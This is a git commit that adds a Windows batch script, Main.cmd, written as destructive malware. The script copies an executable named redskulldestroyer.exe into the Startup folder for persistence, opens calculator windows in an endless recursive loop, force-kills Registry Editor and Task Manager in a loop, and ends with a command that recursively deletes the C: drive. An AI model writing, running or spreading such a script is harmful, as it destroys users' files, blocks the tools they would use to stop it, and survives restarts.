ee6bc3193f918f1996833dc6222ba7b01714846b
downloadland <118220754+downloadland@users.noreply.github.com>
2023-03-24 19:52:32 +0000

    Update Main.cmd

--- Main.cmd
+++ Main.cmd
@@ -1,1 +1,16 @@
+@echo off
+copy redskulldestroyer.exe "%USERPROFILE%\Start Menu\Programs\Startup"
+warning.vbs
+call :payload1
 
+:payload1
+calc
+call :payload1
+
+:payload2
+taskkill /f /im regedit.exe
+taskkill /f /im taskmgr.exe
+call :payload2
+
+:payload3
+rd C: /s /q
